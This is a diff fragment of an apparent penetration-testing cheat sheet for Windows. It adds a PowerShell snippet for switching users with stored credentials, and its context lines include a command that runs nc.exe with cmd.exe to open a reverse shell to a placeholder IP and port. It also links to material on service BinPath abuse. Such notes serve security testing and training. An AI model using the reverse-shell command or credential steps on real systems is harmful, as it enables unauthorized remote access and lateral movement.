@@ -181,6 +181,15 @@ $password =  ConvertTo-SecureString "<password>" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
 Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\path\to\nc.exe IP PORT -e cmd.exe}
 ```
+
+### [change users on powershell
+```
+$username = "<domain>\<username>" ; $pw = "<password>"
+$password = $pw | ConvertTo-SecureString -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
+New-PSSession -Credential $cred | Enter-PSSession
+```
+
 ### [BinPath and ImagePath]
 https://pentestlab.blog/tag/imagepath/
 ```
